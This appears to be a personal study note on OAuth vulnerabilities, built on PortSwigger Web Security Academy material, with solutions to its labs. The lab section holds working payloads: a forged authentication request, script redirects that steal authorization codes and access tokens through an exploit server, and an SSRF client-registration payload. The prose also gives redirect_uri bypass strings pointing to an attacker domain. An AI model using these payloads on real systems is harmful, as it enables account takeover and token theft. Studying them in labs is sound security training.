# OAuth authentication

## **OAuth grant types**

[OAuth grant types | Web Security Academy](https://portswigger.net/web-security/oauth/grant-types)

### **Authorization code grant type**

![image.png](OAuth%20authentication/image.png)

### **Implicit grant type**

![image.png](OAuth%20authentication/image%201.png)

## **Exploiting OAuth authentication vulnerabilities**

Vulnerabilities can arise in the client application's implementation of OAuth as well as in the configuration of the OAuth service itself. 

### **Vulnerabilities in the OAuth client application**

Client applications will often use a reputable, battle-hardened OAuth service that is well protected against widely known exploits. However, their own side of the implementation may be less secure. 

#### **Improper implementation of the implicit grant type**

The client application will often submit this data to the server in a `POST` request and then assign the user a session cookie, effectively logging them in. This request is roughly equivalent to the form submission request that might be sent as part of a classic, password-based login. However, in this scenario, the server does not have any secrets or passwords to compare with the submitted data, which means that it is implicitly trusted.

In the implicit flow, this `POST` request is exposed to attackers via their browser. As a result, this behavior can lead to a serious vulnerability if the client application doesn't properly check that the access token matches the other data in the request. In this case, an attacker can simply change the parameters sent to the server to impersonate any user.

#### **Flawed CSRF protection**

Although many components of the OAuth flows are optional, some of them are strongly recommended unless there's an important reason not to use them. One such example is the `state` parameter.

The `state` parameter should ideally contain an unguessable value, such as the hash of something tied to the user's session when it first initiates the OAuth flow. This value is then passed back and forth between the client application and the OAuth service as a form of CSRF token for the client application. Therefore, if you notice that the authorization request does not send a `state` parameter, this is extremely interesting from an attacker's perspective. It potentially means that they can initiate an OAuth flow themselves before tricking a user's browser into completing it, similar to a traditional CSRF attack. This can have severe consequences depending on how OAuth is being used by the client application.

Consider a website that allows users to log in using either a classic, password-based mechanism or by linking their account to a social media profile using OAuth. In this case, if the application fails to use the `state` parameter, an attacker could potentially hijack a victim user's account on the client application by binding it to their own social media account.

Note that if the site allows users to log in exclusively via OAuth, the `state` parameter is arguably less critical. However, not using a `state` parameter can still allow attackers to construct login CSRF attacks, whereby the user is tricked into logging in to the attacker's account.

### **Leaking authorization codes and access tokens**

Perhaps the most infamous OAuth-based vulnerability is when the configuration of the OAuth service itself enables attackers to steal authorization codes or access tokens associated with other users' accounts. By stealing a valid code or token, the attacker may be able to access the victim's data. Ultimately, this can completely compromise their account - the attacker could potentially log in as the victim user on any client application that is registered with this OAuth service.

Depending on the grant type, either a code or token is sent via the victim's browser to the `/callback` endpoint specified in the `redirect_uri` parameter of the authorization request. If the OAuth service fails to validate this URI properly, an attacker may be able to construct a CSRF-like attack, tricking the victim's browser into initiating an OAuth flow that will send the code or token to an attacker-controlled `redirect_uri`.

In the case of the authorization code flow, an attacker can potentially steal the victim's code before it is used. They can then send this code to the client application's legitimate `/callback` endpoint (the original `redirect_uri`) to get access to the user's account. In this scenario, an attacker does not even need to know the client secret or the resulting access token. As long as the victim has a valid session with the OAuth service, the client application will simply complete the code/token exchange on the attacker's behalf before logging them in to the victim's account.

Note that using `state` or `nonce` protection does not necessarily prevent these attacks because an attacker can generate new values from their own browser.

#### **Flawed redirect_uri validation**

It is best practice for client applications to provide a whitelist of their genuine callback URIs when registering with the OAuth service. This way, when the OAuth service receives a new request, it can validate the `redirect_uri` parameter against this whitelist. In this case, supplying an external URI will likely result in an error. However, there may still be ways to bypass this validation.

When auditing an OAuth flow, you should try experimenting with the `redirect_uri` parameter to understand how it is being validated. For example:

- Some implementations allow for a range of subdirectories by checking only that the string starts with the correct sequence of characters, i.e., an approved domain. You should try removing or adding arbitrary paths, query parameters, and fragments to see what you can change without triggering an error.
- If you can append extra values to the default `redirect_uri` parameter, you might be able to exploit discrepancies between the parsing of the URI by the different components of the OAuth service. For example, you can try techniques such as: `https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/`
    
    If you're not familiar with these techniques, we recommend reading our content on how to [circumvent common SSRF defences](https://portswigger.net/web-security/ssrf#circumventing-common-ssrf-defenses) and [CORS](https://portswigger.net/web-security/cors#errors-parsing-origin-headers).
    
- You may occasionally come across server-side parameter pollution vulnerabilities. Just in case, you should try submitting duplicate `redirect_uri` parameters as follows: `https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net`
- Some servers also give special treatment to `localhost` URIs as they're often used during development. In some cases, any redirect URI beginning with `localhost` may be accidentally permitted in the production environment. This could allow you to bypass the validation by registering a domain name such as `localhost.evil-user.net`.

It is important to note that you shouldn't limit your testing to just probing the `redirect_uri` parameter in isolation. In the wild, you will often need to experiment with different combinations of changes to several parameters. Sometimes changing one parameter can affect the validation of others. For example, changing the `response_mode` from `query` to `fragment` can sometimes completely alter the parsing of the `redirect_uri`, allowing you to submit URIs that would otherwise be blocked. Likewise, if you notice that the `web_message` response mode is supported, this often allows a wider range of subdomains in the `redirect_uri`.

#### **Stealing codes and access tokens via a proxy page**

Against more robust targets, you might find that no matter what you try, you are unable to successfully submit an external domain as the `redirect_uri`. However, that doesn't mean it's time to give up.

By this stage, you should have a relatively good understanding of which parts of the URI you can tamper with. The key now is to use this knowledge to try and access a wider attack surface within the client application itself. In other words, try to work out whether you can change the `redirect_uri` parameter to point to any other pages on a whitelisted domain.

Try to find ways that you can successfully access different subdomains or paths. For example, the default URI will often be on an OAuth-specific path, such as `/oauth/callback`, which is unlikely to have any interesting subdirectories. However, you may be able to use directory traversal tricks to supply any arbitrary path on the domain. Something like this:

`https://client-app.com/oauth/callback/../../example/path`

May be interpreted on the back-end as:

`https://client-app.com/example/path`

Once you identify which other pages you are able to set as the redirect URI, you should audit them for additional vulnerabilities that you can potentially use to leak the code or token. For the [authorization code flow](https://portswigger.net/web-security/oauth/grant-types#authorization-code-grant-type), you need to find a vulnerability that gives you access to the query parameters, whereas for the [implicit grant type](https://portswigger.net/web-security/oauth/grant-types#implicit-grant-type), you need to extract the URL fragment.

One of the most useful vulnerabilities for this purpose is an open redirect. You can use this as a proxy to forward victims, along with their code or token, to an attacker-controlled domain where you can host any malicious script you like.

Note that for the implicit grant type, stealing an access token doesn't just enable you to log in to the victim's account on the client application. As the entire implicit flow takes place via the browser, you can also use the token to make your own API calls to the OAuth service's resource server. This may enable you to fetch sensitive user data that you cannot normally access from the client application's web UI.

### **Flawed scope validation**

In any OAuth flow, the user must approve the requested access based on the scope defined in the authorization request. The resulting token allows the client application to access only the scope that was approved by the user. But in some cases, it may be possible for an attacker to "upgrade" an access token (either stolen or obtained using a malicious client application) with extra permissions due to flawed validation by the OAuth service. The process for doing this depends on the grant type:

[**Scope upgrade: authorization code flow**](https://portswigger.net/web-security/oauth#flawed-scope-validation)

[**Scope upgrade: implicit flow**](https://portswigger.net/web-security/oauth#flawed-scope-validation)

### **Unverified user registration**

When authenticating users via OAuth, the client application makes the implicit assumption that the information stored by the OAuth provider is correct. This can be a dangerous assumption to make.

Some websites that provide an OAuth service allow users to register an account without verifying all of their details, including their email address in some cases. An attacker can exploit this by registering an account with the OAuth provider using the same details as a target user, such as a known email address. Client applications may then allow the attacker to sign in as the victim via this fraudulent account with the OAuth provider.

## **OpenID Connect**

[OpenID Connect | Web Security Academy](https://portswigger.net/web-security/oauth/openid)

## Labs

[**Authentication bypass via OAuth implicit flow**](https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow)

```markdown
# Put target user email into the /authenticate endpoint.

POST /authenticate HTTP/2
Host: ID.web-security-academy.net

{
	"email":"ARBITRARY USER EMAIL",
	"username":"wiener",
	"token":"OBY3eWI_nmkjESEZTd5ghCO1bdxBiskKM_XGMUYokf8"
}
```

[**Forced OAuth profile linking**](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)

```markdown
# Notice that the Authorization request does not include a state parameter to   protect against CSRF attacks.
# Link social media profile to existing account.
# In the GET /auth?client_id[...] request, observe that the redirect_uri for    this functionality sends the authorization code to /oauth-linking.
# Forward any requests until interpret the one for GET /oauth-linking?code=[...].
# Put the URL in the exploit server and devliver to the target.
<script>
document.location='//ID.web-security-academy.net/oauth-linking?code=TOKEN';
</script>
# It will complete the OAuth flow using own social media profile, attaching it  to the target account on the blog website
```

[**OAuth account hijacking via redirect_uri**](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri)

```markdown
# Change the redirect_uri in Authorization request to point to the exploit.
# Observe that there is a log entry in exploit server log containing an         authorization code
# Put the following payload in exploit server and deliver to target.
<script>
document.location='https://oauth-ID.oauth-server.net/auth?client_id=m8d0kehphn10d4wqfpywr&redirect_uri=https://exploit-ID.exploit-server.net/oauth-callback-leak&response_type=code&scope=openid%20profile%20email';
</script>
#  Use the stolen code to navigate to:
https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE
# The rest of the OAuth flow will be completed automatically and will be logged in as the target user.
```

[**Stealing OAuth access tokens via an open redirect**](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect)

```markdown
# Note that external redirect_uri is being validated against a whitelist,       However additional characters is accepted including the path traversal sequence
# Observe Open-Redirect vulnerability in "Next Post" functionality
GET /post/next?path=[...]
# Craft the following payload, inejcting redirect_url parameter with Open       Redirect vulnerability, leading to redirect user into the exploit server.
https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email
# Put the following payload in Exploit Server, which will log Access Token
<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
# Go to the GET /me request and replace the token in the Authorization: Bearer  header with the retrieved token.
# Note that API call is successfully made, leaking API token as well. 
```

[**SSRF via OpenID dynamic client registration**](https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration)

```markdown
# Configuration file:
https://oauth-OAUTH-SERVER.oauth-server.net/.well-known/openid-configuration
# Registration Endpoint:
https://oauth-OAUTH-SERVER.oauth-server.net/reg
# Registering own client application 
POST /reg HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
Content-Type: application/json

{
    "redirect_uris" : [
        "https://example.com"
    ],
    "logo_uri" : "https://BURP-COLLABORATOR-SUBDOMAIN"
}

# Access the content:
GET /client/CLIENT-ID/logo

# Replace logo_uri with specified endpoint to fetch the sensitive data.
```